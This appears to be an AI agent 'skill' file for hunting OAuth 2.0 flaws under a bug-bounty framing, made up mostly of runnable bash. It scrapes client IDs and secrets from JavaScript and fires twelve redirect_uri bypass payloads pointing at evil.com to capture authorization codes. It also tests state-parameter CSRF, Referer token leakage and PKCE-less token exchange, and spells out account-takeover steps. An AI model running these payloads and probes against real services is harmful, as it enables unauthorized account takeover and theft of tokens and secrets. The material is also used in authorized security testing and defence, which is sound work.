---
name: k1nzr3c0n-hunt-oauth
description: "OAuth 2.0 attack skill built from 19 disclosed bug bounty reports. Covers redirect_uri host confusion, path traversal bypass, parameter pollution, state/nonce bypass, mobile deep link trust, token leakage via Referer. Also PKCE downgrade, implicit flow token exposure, authorization code replay."
tags: [oauth, sso, ato, hunt, web-security, bug-bounty]
report_count: 19
---

# K1NZR3C0N Hunt — OAuth 2.0 Attacks

> **Impact required**: OAuth bugs must prove account takeover or token exfil — not just redirect quirks.
> **Two-account rule**: ATO via OAuth needs proof of logging in as another user.

---

## Crown Jewels

```
Priority 1 — redirect_uri bypass → steal authorization code → ATO
Priority 2 — State parameter CSRF → link attacker's account to victim's
Priority 3 — Token leakage via Referer header (implicit flow)
Priority 4 — Authorization code replay (no PKCE)
Priority 5 — Mobile deep link hijack (custom scheme abuse)
```

---

## Phase 0 — Recon

```bash
TARGET="${TARGET:-}"
HUNT="/tmp/hunt_oauth_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"

echo "=== OAuth Endpoint Discovery ==="
RUNS_BASE="/app/runs"
grep -rhoP 'https?://[^\s"]+(?:oauth|authorize|auth|callback|redirect_uri|token|access_token|code=)' \
  "$RUNS_BASE" 2>/dev/null | sort -u | tee "$HUNT/oauth_endpoints.txt" | head -20

# Find client_id, redirect_uri in JS files
JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
[ -d "$JS_DIR" ] && grep -hoP '(?:client_id|redirect_uri|client_secret|oauth_key)["\s:=]+["\x27]([^"\x27\s]+)' \
  "$JS_DIR"/*.js 2>/dev/null | sort -u | tee "$HUNT/oauth_config.txt"
cat "$HUNT/oauth_config.txt"
```

## Phase 1 — redirect_uri Bypass

```bash
echo "=== redirect_uri Bypass Techniques ==="
CLIENT_ID="${OAUTH_CLIENT_ID:-}"
AUTH_EP="${OAUTH_AUTH_EP:-https://${TARGET}/oauth/authorize}"
REDIR="${OAUTH_REDIR:-https://${TARGET}/callback}"

# Bypass techniques (12 variants)
BYPASSES=(
  # 1. Extra path appended
  "${REDIR}/../../evil.com"
  "${REDIR}/../../../evil.com"
  # 2. Different path on same host
  "${REDIR}@evil.com"
  # 3. Host confusion
  "https://${TARGET}.evil.com/callback"
  "https://evil.com%09${TARGET}/callback"
  # 4. URL encoding
  "https://${TARGET}/callback%2f%2fevil.com"
  "https://${TARGET}/callback%2fevil.com"
  # 5. Parameter pollution
  "${REDIR}&redirect_uri=https://evil.com"
  # 6. Hash fragment
  "${REDIR}#https://evil.com"
  # 7. Wildcard subdomain (if *.target.com whitelisted)
  "https://evil.${TARGET}/callback"
  # 8. Open redirect chain
  "${REDIR%callback}redirect?url=https://evil.com"
)

for BYPASS in "${BYPASSES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$BYPASS")
  RESP=$(curl -sk -I "${AUTH_EP}?client_id=${CLIENT_ID}&redirect_uri=${ENCODED}&response_type=code&scope=openid" \
    -H "Cookie: ${SESSION_COOKIE:-}" 2>/dev/null)
  
  # Check if server redirects to our bypass location
  LOCATION=$(echo "$RESP" | grep -i '^Location:' | tr -d '\r')
  echo "$LOCATION" | grep -iq 'evil.com' && echo "  [BYPASS] $BYPASS → $LOCATION"
  echo "$RESP" | grep -qi '200\|302' | head -1
done
```

## Phase 2 — State Parameter CSRF

```bash
echo "=== State Parameter CSRF ==="
AUTH_EP="${OAUTH_AUTH_EP:-https://${TARGET}/oauth/authorize}"
CLIENT_ID="${OAUTH_CLIENT_ID:-}"

# Test: initiate flow without state, with empty state, with fixed state
for STATE in "" "fixed_state" "aaaa" "null"; do
  RESP=$(curl -sk -I "${AUTH_EP}?client_id=${CLIENT_ID}&redirect_uri=${REDIR}&response_type=code&scope=openid&state=${STATE}" \
    -H "Cookie: ${SESSION_COOKIE:-}")
  STATUS=$(echo "$RESP" | head -1)
  echo "  State='${STATE}' → $STATUS"
done

echo ""
echo "If state not validated → CSRF chain: attacker initiates OAuth,victim clicks,attacker's account linked"
echo "PoC steps:"
echo "  1. Attacker starts OAuth: ${AUTH_EP}?client_id=${CLIENT_ID}&...&state=ATTACKER_STATE"
echo "  2. Intercept redirect, get code=ATTACKER_CODE"
echo "  3. Send victim to: https://${TARGET}/callback?code=ATTACKER_CODE&state=ATTACKER_STATE"
echo "  4. Victim's session linked to attacker's account → ATO"
```

## Phase 3 — Token Leakage via Referer

```bash
echo "=== Token Leakage via Referer ==="
# Implicit flow: access_token in URL fragment → if page loads external resources, Referer leaks it

# Check if auth server uses implicit flow
RESP=$(curl -sk -I "${AUTH_EP}?client_id=${CLIENT_ID}&response_type=token&..." \
  -H "Cookie: ${SESSION_COOKIE:-}" 2>/dev/null)
echo "$RESP" | grep -i 'access_token' && echo "  [IMPLICIT] Token in URL fragment"

# Check callback page for external resource loads
CALLBACK_RESP=$(curl -sk "https://${TARGET}/callback?access_token=test_leak&..." 2>/dev/null)
echo "$CALLBACK_RESP" | grep -oP 'src=["\x27][^"\x27]+|href=["\x27][^"\x27]+' | \
  grep -vE '^(src|href)=["\x27](https?://'${TARGET}|/)' | head -10 | \
  sed 's/^/  [EXTERNAL] /'
```

## Phase 4 — Authorization Code Replay & PKCE

```bash
echo "=== Authorization Code Replay ==="
echo "Test if authorization code can be used twice (no one-time enforcement):"
echo ""
echo "  1. Complete OAuth flow, capture: code=AUTHORIZATION_CODE"
echo "  2. Exchange code for token (first use)"
echo "  3. Try to exchange the SAME code again"
echo "  4. If second exchange succeeds → code replay vulnerability"
echo ""

# PKCE downgrade
echo "=== PKCE Downgrade ==="
echo "If PKCE (S256) normally required, try sending without:"
RESP=$(curl -sk -X POST "https://${TARGET}/oauth/token" \
  -d "grant_type=authorization_code&code=${AUTH_CODE:-TEST}&redirect_uri=${REDIR}&client_id=${CLIENT_ID:-TEST}")
echo "$RESP" | python3 -m json.tool 2>/dev/null | head -5
echo ""
echo "If token returned without PKCE verifier → PKCE not enforced"
```

## Phase 5 — Gate 0

```bash
echo "=== OAuth Gate 0 ==="
echo "  □ redirect_uri: actually redirects to evil.com (not just 302 to target)"
echo "  □ ATO chain: authorization code captured + exchanged for real token + logged in as victim"
echo "  □ State CSRF: account actually linked to attacker's identity"
echo "  □ Referer leak: external request visible in server logs with token"
echo "  □ Two-account: victim and attacker are distinct users"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
OAuth redirect_uri bypass allows authorization code theft leading to account takeover
Missing state parameter validation in OAuth flow enables CSRF account linking attack
Implicit OAuth flow exposes access_token in URL, leaked via Referer header to [third-party analytics]
```
